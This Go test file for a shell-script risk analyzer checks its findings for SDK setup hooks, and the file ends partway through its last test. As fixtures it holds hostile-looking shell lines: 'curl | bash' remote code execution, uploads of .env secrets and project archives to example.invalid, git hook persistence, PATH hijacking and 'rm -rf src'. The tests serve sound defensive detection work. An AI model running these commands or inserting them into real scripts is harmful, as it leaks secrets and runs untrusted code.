package finding_test

import (
	"reflect"
	"testing"

	"github.com/shizuku198411/Latra/internal/analysis"
	"github.com/shizuku198411/Latra/internal/finding"
	"github.com/shizuku198411/Latra/internal/sdk"
	"github.com/shizuku198411/Latra/internal/shell"
)

func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
	t.Parallel()

	positive := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	findings := finding.AnalyzeSDK(positive)
	remote := findFinding(findings, "risk.remote-content-execution")
	if remote == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if remote.Confidence != "high" || len(remote.Evidence) != 2 || remote.Evidence[1].FromOperationID == "" || remote.Evidence[1].ToOperationID == "" {
		t.Fatalf("remote finding = %#v", remote)
	}

	nearMiss := analyzedSDK(t, "curl -o /tmp/install https://example.invalid/install\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(nearMiss), "risk.remote-content-execution"); got != nil {
		t.Fatalf("near-miss finding = %#v", got)
	}
}

func TestCDIsKnownInRootHooks(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cd /tmp\n", sdk.HookSetupBase)
	findings := finding.AnalyzeSDK(item)
	if got := findFinding(findings, "risk.unknown-command-root"); got != nil {
		t.Fatalf("cd was reported as an unknown root command: %#v", got)
	}
	if got := findFinding(findings, "assurance.all-commands-known"); got == nil {
		t.Fatalf("cd did not contribute to known-command assurance: %#v", findings)
	}
}

func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "payload=$(curl https://example.invalid/install)\nprintf '%s' \"$payload\" | bash\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-execution"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestDynamicExecutionWithProjectAccessIsRisk(t *testing.T) {
	t.Parallel()

	project := analyzedSDK(t, "payload='printf safe'\neval \"$payload\"\n", sdk.HookSetupProject)
	got := findFinding(finding.AnalyzeSDK(project), "risk.dynamic-execution")
	if got == nil || got.Severity != "high" || got.Weight != 50 || got.Evidence[0].ID != "dynamic-execution" {
		t.Fatalf("dynamic execution finding = %#v; all = %#v", got, finding.AnalyzeSDK(project))
	}

	base := analyzedSDK(t, "payload='printf safe'\neval \"$payload\"\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(base), "risk.dynamic-execution"); got != nil {
		t.Fatalf("base setup matched project-access rule: %#v", got)
	}
}

func TestRepositoryHookPersistenceIsRisk(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "hook file", content: "printf '#!/bin/sh' > .git/hooks/pre-commit\n"},
		{name: "hook path config", content: "git config core.hooksPath .githooks\n"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, test.content, sdk.HookSetupProject)), "risk.repository-hook-persistence")
			if got == nil || got.Severity != "high" || got.Weight != 50 {
				t.Fatalf("repository persistence finding = %#v", got)
			}
		})
	}

	for _, content := range []string{
		"printf value > .git/config\n",
		"printf '#!/bin/sh' > generated/pre-commit\n",
		"git config user.name fixture\n",
		"git config core.hooksPath\n",
		"git config --unset core.hooksPath\n",
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.repository-hook-persistence"); got != nil {
			t.Errorf("near miss matched repository persistence: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectInPlaceModificationIsRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"sed -i 's/before/after/' config.txt\n",
		"sed -i.bak 's/before/after/' /project/config.txt\n",
	} {
		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-file-modification")
		if got == nil || got.Severity != "medium" || got.Weight != 25 || got.Evidence[0].ID != "project-in-place-modification" {
			t.Fatalf("project modification finding = %#v", got)
		}
	}

	for _, test := range []struct {
		hook    sdk.HookName
		content string
	}{
		{hook: sdk.HookSetupProject, content: "sed 's/before/after/' config.txt\n"},
		{hook: sdk.HookSetupBase, content: "sed -i 's/before/after/' /project/config.txt\n"},
		{hook: sdk.HookSetupProject, content: "printf generated > output.txt\n"},
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, test.content, test.hook)), "risk.project-file-modification"); got != nil {
			t.Errorf("near miss matched project modification: %#v", got)
		}
	}
}

func TestProjectControlFileModificationIsHighRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"printf payload > Makefile\n",
		"printf payload > /project/.github/workflows/ci.yml\n",
		"printf payload > /project/.git/config\n",
		"cp /tmp/tool /project/scripts/build.sh\n",
	} {
		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-control-file-modification")
		if got == nil || got.Severity != "high" || got.Weight != 50 {
			t.Fatalf("project control modification = %#v for %q", got, content)
		}
	}

	for _, content := range []string{
		"printf generated > dist/package.txt\n",
		"git clone https://example.invalid/repo vendor/repo\n",
		"printf generated > /tmp/Makefile\n",
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-control-file-modification"); got != nil {
			t.Errorf("benign/non-project write matched control modification: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectSourceDeletionIsHighRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{"rm -rf src\n", "rm -- /project/Makefile\n"} {
		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-source-deletion")
		if got == nil || got.Severity != "high" {
			t.Fatalf("project deletion = %#v for %q", got, content)
		}
	}

	for _, content := range []string{"rm -rf dist\n", "rm -f /tmp/Makefile\n"} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-source-deletion"); got != nil {
			t.Errorf("generated/non-project deletion matched: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectAliasReusesMutationFindings(t *testing.T) {
	t.Parallel()

	content := `ln -s /project /tmp/workspace
cp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml
rm -rf /tmp/workspace/src
`
	findings := finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject))
	control := findFinding(findings, "risk.project-control-file-modification")
	deletion := findFinding(findings, "risk.project-source-deletion")
	if control == nil || control.Evidence[0].NormalizedValue != "/project/.github/workflows/alias.yml" {
		t.Fatalf("alias control modification = %#v; all = %#v", control, findings)
	}
	if deletion == nil || deletion.Evidence[0].NormalizedValue != "/project/src" {
		t.Fatalf("alias source deletion = %#v; all = %#v", deletion, findings)
	}
	for _, got := range []*finding.Finding{control, deletion} {
		var alias bool
		for _, evidence := range got.Evidence {
			alias = alias || evidence.Type == "alias" && evidence.NormalizedValue != ""
		}
		if !alias {
			t.Errorf("missing alias evidence: %#v", got.Evidence)
		}
	}
}

func TestNonProjectAndCyclicAliasesDoNotCreateProjectFindings(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"ln -s /tmp/source /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml\n",
		"ln -s /tmp/b /tmp/a\nln -s /tmp/a /tmp/b\ncp /tmp/ci.yml /tmp/a/.github/workflows/alias.yml\n",
		"ln -s /project /tmp/workspace\nrm /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml\n",
	} {
		findings := finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject))
		if got := findFinding(findings, "risk.project-control-file-modification"); got != nil {
			t.Errorf("non-Project/invalidated alias matched control modification: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectExecutableCreationRequiresWriteAndChmod(t *testing.T) {
	t.Parallel()

	positive := "printf '#!/bin/sh' > scripts/tool.sh\nchmod +x scripts/tool.sh\n"
	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, positive, sdk.HookSetupProject)), "risk.project-executable-created")
	if got == nil || got.Severity != "high" || len(got.Evidence) != 2 {
		t.Fatalf("project executable finding = %#v", got)
	}

	for _, content := range []string{
		"chmod +x scripts/existing.sh\n",
		"printf '#!/bin/sh' > scripts/tool.sh\n",
		"printf '#!/bin/sh' > /tmp/tool\nchmod +x /tmp/tool\n",
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-executable-created"); got != nil {
			t.Errorf("uncorrelated executable matched: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectPermissionModificationIsRisk(t *testing.T) {
	t.Parallel()

	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, "chmod 0600 config.txt\n", sdk.HookSetupProject)), "risk.project-permission-modification")
	if got == nil || got.Severity != "medium" || got.Weight != 25 {
		t.Fatalf("project permission finding = %#v", got)
	}
	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, "chmod 0600 /tmp/config.txt\n", sdk.HookSetupProject)), "risk.project-permission-modification"); got != nil {
		t.Fatalf("non-project permission matched: %#v", got)
	}
}

func TestProjectVCSStateRewriteIsHighRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"git reset --hard HEAD\n",
		"git -C /project clean -ffdx\n",
		"git remote set-url origin https://example.invalid/repo.git\n",
		"git update-index --skip-worktree package.json\n",
	} {
		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-vcs-state-rewrite")
		if got == nil || got.Severity != "high" || got.Weight != 50 {
			t.Fatalf("VCS rewrite = %#v for %q", got, content)
		}
	}

	for _, content := range []string{
		"git status\n",
		"git diff\n",
		"git -C /tmp/repo reset --hard HEAD\n",
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-vcs-state-rewrite"); got != nil {
			t.Errorf("read-only/non-project Git matched: content=%q finding=%#v", content, got)
		}
	}
}

func TestStateLifecycleRisks(t *testing.T) {
	t.Parallel()

	save := analyzedSDK(t, `cp /project/.env "$SDK_STATE_DIR/archive/project.env"
cp /project/scripts/restore.sh "$SDK_STATE_DIR/restore.sh"
`, sdk.HookSaveState)
	restore := analyzedSDK(t, `install -m 0755 "$SDK_STATE_DIR/restore.sh" /project/scripts/post-restore.sh
cp "$SDK_STATE_DIR/archive/project.env" /project/.restored-environment
`, sdk.HookRestoreState)
	save.Hooks = append(save.Hooks, restore.Hooks...)
	findings := finding.AnalyzeSDK(save)
	secret := findFinding(findings, "risk.project-secret-persisted-to-state")
	project := findFinding(findings, "risk.state-content-to-project")
	if secret == nil || secret.Severity != "high" {
		t.Fatalf("secret state finding = %#v; all = %#v", secret, findings)
	}
	if project == nil || project.Severity != "high" || len(project.Evidence) < 3 {
		t.Fatalf("state Project finding = %#v; all = %#v", project, findings)
	}
	if project.Evidence[1].ID != "state-flow" || project.Evidence[2].NormalizedValue != "/project/scripts/post-restore.sh" {
		t.Errorf("state flow evidence = %#v", project.Evidence)
	}
}

func TestOrdinaryStateCacheRestoreIsNotHighRisk(t *testing.T) {
	t.Parallel()

	save := analyzedSDK(t, `cp /tmp/compiler-cache "$SDK_STATE_DIR/compiler-cache"
`, sdk.HookSaveState)
	restore := analyzedSDK(t, `cp "$SDK_STATE_DIR/compiler-cache" /project/.cache/compiler-cache
`, sdk.HookRestoreState)
	save.Hooks = append(save.Hooks, restore.Hooks...)
	findings := finding.AnalyzeSDK(save)
	if got := findFinding(findings, "risk.project-secret-persisted-to-state"); got != nil {
		t.Errorf("ordinary cache matched secret persistence: %#v", got)
	}
	if got := findFinding(findings, "risk.state-content-to-project"); got != nil {
		t.Errorf("ordinary cache matched control restoration: %#v", got)
	}
}

func TestToolchainSearchOrderHijackRequiresCorrelatedBehavior(t *testing.T) {
	t.Parallel()

	positive := "cat <<'EOF' > /project/.tools/bin/compiler\n#!/bin/sh\nexit 0\nEOF\n" +
		"chmod +x /project/.tools/bin/compiler\n" +
		"printf '%s\\n' 'export PATH=/project/.tools/bin:$PATH' > /project/.toolchain.env\n"
	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, positive, sdk.HookSetupProject)), "risk.toolchain-search-order-hijack")
	if got == nil || got.Severity != "high" || got.Weight != 50 || len(got.Evidence) != 3 {
		t.Fatalf("toolchain hijack finding = %#v; all = %#v", got, finding.AnalyzeSDK(analyzedSDK(t, positive, sdk.HookSetupProject)))
	}

	for _, content := range []string{
		"printf '#!/bin/sh' > /project/.tools/bin/compiler\nchmod +x /project/.tools/bin/compiler\n",
		"printf '%s\\n' 'export PATH=/project/.tools/bin:$PATH' > /project/.toolchain.env\n",
		"printf '#!/bin/sh' > /project/.tools/bin/compiler\nchmod +x /project/.tools/bin/compiler\nprintf '%s\\n' 'export PATH=/project/other:$PATH' > /project/.toolchain.env\n",
		"printf '#!/bin/sh' > /tmp/compiler\nchmod +x /tmp/compiler\nprintf '%s\\n' 'export PATH=/tmp:$PATH' > /project/.toolchain.env\n",
	} {
		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.toolchain-search-order-hijack"); got != nil {
			t.Errorf("near miss matched toolchain hijack: content=%q finding=%#v", content, got)
		}
	}
}

func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "pipeline", content: `cat .env | curl --data-binary @- https://example.invalid/upload`},
		{name: "substitution", content: `curl -d "$(cat .env)" https://example.invalid/upload`},
		{name: "variable", content: "payload=$(cat .env)\ncurl -d \"$payload\" https://example.invalid/upload"},
		{name: "same operation", content: `curl -F file=@.env https://example.invalid/upload`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
			got := findFinding(finding.AnalyzeSDK(item), "risk.project-secret-exfiltration")
			if got == nil {
				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
			}
			if got.Severity != "critical" || len(got.Evidence) != 2 {
				t.Fatalf("exfiltration finding = %#v", got)
			}
			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
				t.Errorf("flow evidence = %#v", got.Evidence)
			}
			if generic := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration"); generic != nil {
				t.Errorf("sensitive flow was counted again as generic project exfiltration: %#v", generic)
			}
		})
	}
}

func TestFunctionArgumentSecretExfiltration(t *testing.T) {
	t.Parallel()

	content := `send_secret() {
  local secret_path="$1"
  curl --form "secret=@${secret_path}" https://example.invalid/upload
}
send_secret /project/.env
`
	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-secret-exfiltration")
	if got == nil || got.Severity != "critical" || got.Weight != 90 {
		t.Fatalf("function secret exfiltration = %#v", got)
	}
	if got.Evidence[0].NormalizedValue != "/project/.env" || got.Evidence[len(got.Evidence)-1].ID != "external-send" {
		t.Errorf("function secret evidence = %#v", got.Evidence)
	}
}

func TestRemoteContentToProjectFlowVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "redirect", content: `curl https://example.invalid/tool > generated/tool`},
		{name: "pipeline", content: `curl https://example.invalid/tool | tee generated/tool`},
		{name: "curl output", content: `curl --output generated/tool https://example.invalid/tool`},
		{name: "wget output", content: `wget -O generated/tool https://example.invalid/tool`},
		{name: "git clone", content: `git clone https://example.invalid/repo external/repo`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
			got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-to-project")
			if got == nil || got.Severity != "medium" || got.Weight != 25 || len(got.Evidence) != 2 {
				t.Fatalf("remote project flow = %#v; all = %#v", got, finding.AnalyzeSDK(item))
			}
			if got.Evidence[0].ID != "network-download" || got.Evidence[1].ID != "project-write" ||
				got.Evidence[1].NormalizedValue != "/project/generated/tool" && got.Evidence[1].NormalizedValue != "/project/external/repo" {
				t.Errorf("remote project evidence = %#v", got.Evidence)
			}
		})
	}
}

func TestRemoteContentToProjectRejectsDisconnectedOrUnavailableFlows(t *testing.T) {
	t.Parallel()

	tests := []struct {
		hook    sdk.HookName
		content string
	}{
		{hook: sdk.HookSetupProject, content: "curl https://example.invalid/tool\nprintf generated > generated/tool\n"},
		{hook: sdk.HookSetupProject, content: "curl --output /tmp/tool https://example.invalid/tool\n"},
		{hook: sdk.HookSetupBase, content: "curl https://example.invalid/tool > /project/tool\n"},
	}
	for _, test := range tests {
		item := analyzedSDK(t, test.content, test.hook)
		if got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-to-project"); got != nil {
			t.Errorf("disconnected or unavailable remote project flow = %#v", got)
		}
	}
}

func TestProjectDataExfiltrationFlowVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "pipeline", content: `cat README.md | curl --data-binary @- https://example.invalid/upload`},
		{name: "substitution", content: `curl -d "$(cat README.md)" https://example.invalid/upload`},
		{name: "variable", content: "payload=$(cat README.md)\ncurl -d \"$payload\" https://example.invalid/upload"},
		{name: "same operation", content: `curl -F file=@README.md https://example.invalid/upload`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
			got := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration")
			if got == nil || got.Severity != "high" || got.Weight != 50 || len(got.Evidence) != 2 {
				t.Fatalf("project exfiltration = %#v; all = %#v", got, finding.AnalyzeSDK(item))
			}
			if got.Evidence[0].ID != "project-read" || got.Evidence[0].NormalizedValue != "/project/README.md" || got.Evidence[1].ID != "external-send" {
				t.Errorf("project exfiltration evidence = %#v", got.Evidence)
			}
		})
	}
}

func TestProjectCollectionArtifactExfiltration(t *testing.T) {
	t.Parallel()

	content := `find /project -type f -print0 > /tmp/project-files.list
tar --null --files-from=/tmp/project-files.list --create --gzip --file=/tmp/project-snapshot.tar.gz
cp /tmp/project-snapshot.tar.gz /tmp/staged-snapshot.tar.gz
curl --upload-file /tmp/staged-snapshot.tar.gz https://example.invalid/upload
`
	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration")
	if got == nil || got.Severity != "high" || got.Weight != 50 {
		t.Fatalf("project collection finding = %#v", got)
	}
	if got.Evidence[0].ID != "project-read" || got.Evidence[0].NormalizedValue != "/project" || got.Evidence[len(got.Evidence)-1].ID != "external-send" {
		t.Fatalf("project collection evidence endpoints = %#v", got.Evidence)
	}
	var archive, staged bool
	for _, evidence := range got.Evidence {
		if evidence.Type != "artifact-flow" {
			continue
		}
		archive = archive || evidence.NormalizedValue == "/tmp/project-snapshot.tar.gz"
		staged = staged || evidence.NormalizedValue == "/tmp/staged-snapshot.tar.gz"
	}
	if !archive || !staged {
		t.Errorf("project collection artifact chain = %#v", got.Evidence)
	}
}

func TestNonProjectArchiveUploadIsNotProjectExfiltration(t *testing.T) {
	t.Parallel()

	content := `find /tmp/public -type f -print0 > /tmp/public-files.list
tar --null --files-from=/tmp/public-files.list --create --file=/tmp/public.tar
curl --upload-file /tmp/public.tar https://example.invalid/upload
`
	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration"); got != nil {
		t.Errorf("non-project archive upload matched project exfiltration: %#v", got)
	}
}

func TestDeletedCollectionArtifactCutsProjectFlow(t *testing.T) {
	t.Parallel()

	content := `find /project -type f -print0 > /tmp/project-files.list
rm /tmp/project-files.list
tar --files-from=/tmp/project-files.list --create --file=/tmp/project.tar
curl --upload-file /tmp/project.tar https://example.invalid/upload
`
	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration"); got != nil {
		t.Errorf("deleted artifact continued project flow: %#v", got)
	}
}

func TestSensitiveSuppressionKeepsDifferentGeneralProjectFlow(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cat .env | curl --data-binary @- https://example.invalid/secret\ncat README.md | curl --data-binary @- https://example.invalid/readme\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	secret := findFinding(findings, "risk.project-secret-exfiltration")
	general := findFinding(findings, "risk.project-data-exfiltration")
	if secret == nil || general == nil {
		t.Fatalf("distinct exfiltration flows = %#v", findings)
	}
	if general.Evidence[0].NormalizedValue != "/project/README.md" {
		t.Errorf("generic flow source = %#v", general.Evidence)
	}
}

func TestProjectDataExfiltrationRejectsDisconnectedOrUnavailableFlows(t *testing.T) {
	t.Parallel()

	tests := []struct {
		hook    sdk.HookName
		content string
	}{
		{hook: sdk.HookSetupProject, content: "cat README.md\ncurl -d public https://example.invalid/upload\n"},
		{hook: sdk.HookSetupBase, content: "cat /project/README.md | curl -d @- https://example.invalid/upload\n"},
	}
	for _, test := range tests {
		item := analyzedSDK(t, test.content, test.hook)
		if got := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration"); got != nil {
			t.Errorf("disconnected or unavailable project exfiltration = %#v", got)
		}
	}
}

func TestProjectAccessCreatesUnscoredObservations(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cat README.md\nprintf generated > output.txt\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	read := findFinding(findings, "observation.project-read")
	write := findFinding(findings, "observation.project-write")
	if read == nil || write == nil {
		t.Fatalf("project observations = %#v", findings)
	}
	if read.Kind != finding.KindObservation || read.Weight != 0 || read.Evidence[0].Value != "README.md" || read.Evidence[0].NormalizedValue != "/project/README.md" {
		t.Errorf("read observation = %#v", read)
	}
	if write.Kind != finding.KindObservation || write.Weight != 0 || write.Evidence[0].Value != "output.txt" || write.Evidence[0].NormalizedValue != "/project/output.txt" {
		t.Errorf("write observation = %#v", write)
	}

	without := make([]finding.Finding, 0, len(findings))
	for _, itemFinding := range findings {
		if itemFinding.Kind != finding.KindObservation {
			without = append(without, itemFinding)
		}
	}
	withAssessment := finding.AssessSDK(item, findings)
	withoutAssessment := finding.AssessSDK(item, without)
	if !reflect.DeepEqual(withAssessment.Risk, withoutAssessment.Risk) ||
		!reflect.DeepEqual(withAssessment.Assurance, withoutAssessment.Assurance) ||
		withAssessment.ReviewPriority != withoutAssessment.ReviewPriority ||
		withAssessment.Classification != withoutAssessment.Classification {
		t.Errorf("observation changed assessment: with=%#v without=%#v", withAssessment, withoutAssessment)
	}
}

func TestRelativeProjectAccessIsNotObservedOutsideSetupProject(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cat README.md\n", sdk.HookCheckHealth)
	if got := findFinding(finding.AnalyzeSDK(item), "observation.project-read"); got != nil {
		t.Fatalf("relative health-check observation = %#v", got)
	}
}

func TestProjectSecretExfiltrationRejectsDisconnectedAndUnavailableProject(t *testing.T) {
	t.Parallel()

	disconnected := analyzedSDK(t, "cat .env\ncurl -d public https://example.invalid/upload\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(disconnected), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("disconnected flow finding = %#v", got)
	}

	noProject := analyzedSDK(t, "cat /project/.env | curl --data-binary @- https://example.invalid/upload\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(noProject), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("unmounted project finding = %#v", got)
	}
}

func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "curl -F file=@.env https://example.invalid/upload\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	assessment := finding.AssessSDK(item, findings)
	if assessment.Risk.Score < 80 || assessment.Risk.Level != "critical" || assessment.ReviewPriority.Score < 80 {
		t.Fatalf("assessment = %#v", assessment)
	}
	var highlight *finding.RiskHighlight
	for index := range assessment.KeyRisks {
		if assessment.KeyRisks[index].ID == "risk.project-secret-exfiltration" {
			highlight = &assessment.KeyRisks[index]
			break
		}
	}
	if highlight == nil || len(highlight.Scopes) != 2 {
		t.Fatalf("key risk highlight = %#v", highlight)
	}
	if highlight.Scopes[0].Value != ".env" || highlight.Scopes[1].Value != "file=@.env" {
		t.Errorf("source/sink scopes = %#v", highlight.Scopes)
	}
}

func TestStaticProfileEnvironmentWriteIsCalibratedToLowRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"printf 'export FIXTURE=1\\n' > /etc/profile.d/fixture.sh\n",
		"printf 'export FIXTURE=1\\n' | tee /etc/profile.d/fixture.sh\n",
		"cat <<'EOF' > /etc/profile.d/fixture.sh\nexport FIXTURE=1\nEOF\n",
		"cat <<EOF > /etc/profile.d/fixture.sh\nexport PATH=\"${SDK}/bin:\\$PATH\"\nEOF\n",
		"cat <<EOF >> /etc/profile.d/fixture.sh\nPATH=\"${SDK}/bin:\\$PATH\"\nEOF\n. /etc/profile.d/fixture.sh\n",
	} {
		item := analyzedSDK(t, content, sdk.HookSetupBase)
		findings := finding.AnalyzeSDK(item)
		profile := findFinding(findings, "risk.profile-environment-write")
		if profile == nil || profile.Severity != "low" || profile.Weight != 10 || profile.Confidence != "high" {
			t.Fatalf("profile finding = %#v; all = %#v", profile, findings)
		}
		if generic := findFinding(findings, "risk.persistence-write"); generic != nil {
			t.Fatalf("profile write was counted twice: %#v", findings)
		}
		assessment := finding.AssessSDK(item, findings)
		if assessment.Risk.Score != 10 || assessment.Risk.Level != "low" {
			t.Errorf("profile assessment = %#v", assessment)
		}
	}
}

func TestReadingEnvironmentProfileIsNotPersistenceWrite(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, ". /etc/profile.d/fixture.sh\n", sdk.HookSetupBase)
	findings := finding.AnalyzeSDK(item)
	if generic := findFinding(findings, "risk.persistence-write"); generic != nil {
		t.Fatalf("profile read was classified as persistence write: %#v", findings)
	}
	if profile := findFinding(findings, "risk.profile-environment-write"); profile != nil {
		t.Fatalf("profile read was classified as environment write: %#v", findings)
	}
}

func TestUnsafeProfileWritesRemainGenericPersistenceRisk(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		hook    sdk.HookName
		content string
	}{
		{name: "remote redirect", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile > /etc/profile.d/fixture.sh\n"},
		{name: "remote pipeline", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile | tee /etc/profile.d/fixture.sh\n"},
		{name: "unknown content", hook: sdk.HookSetupBase, content: "printf '%s' \"$PROFILE_CONTENT\" > /etc/profile.d/fixture.sh\n"},
		{name: "executable payload", hook: sdk.HookSetupBase, content: "printf 'curl https://example.invalid/payload | sh' > /etc/profile.d/fixture.sh\n"},
		{name: "arbitrary script", hook: sdk.HookSetupBase, content: "printf 'rm -rf /tmp/fixture' > /etc/profile.d/fixture.sh\n"},
		{name: "heredoc payload", hook: sdk.HookSetupBase, content: "cat <<'EOF' > /etc/profile.d/fixture.sh\ncurl https://example.invalid/payload | sh\nEOF\n"},
		{name: "dynamic heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$PROFILE_CONTENT\nEOF\n"},
		{name: "command substitution heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$(curl https://example.invalid/value)\nEOF\n"},
		{name: "partial path", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > \"/etc/profile.d/$PROFILE_NAME.sh\"\n"},
		{name: "project lifecycle", hook: sdk.HookSetupProject, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.sh\n"},
		{name: "global profile", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile\n"},
		{name: "non shell suffix", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.conf\n"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			findings := finding.AnalyzeSDK(analyzedSDK(t, test.content, test.hook))
			if generic := findFinding(findings, "risk.persistence-write"); generic == nil || generic.Severity != "medium" {
				t.Fatalf("generic persistence finding = %#v; all = %#v", generic, findings)
			}
			if profile := findFinding(findings, "risk.profile-environment-write"); profile != nil {
				t.Fatalf("unsafe write was lowered: %#v", profile)
			}
		})
	}
}

func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.project-write-in-health-check") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "assurance.read-only-health-check") != nil {
		t.Fatalf("unexpected read-only assurance: %#v", findings)
	}
}

func TestHealthCheckLifecycleRiskRequiresCombinedContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	item.Hooks[0].Analysis.Context.ProjectMounted = false
	if got := findFinding(finding.AnalyzeSDK(item), "risk.project-write-in-health-check"); got != nil {
		t.Fatalf("finding matched without project-mounted context: %#v", got)
	}
}

func TestDeviceWriteIgnoresDevNull(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf quiet > /dev/null\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got != nil {
		t.Fatalf("finding = %#v", got)
	}

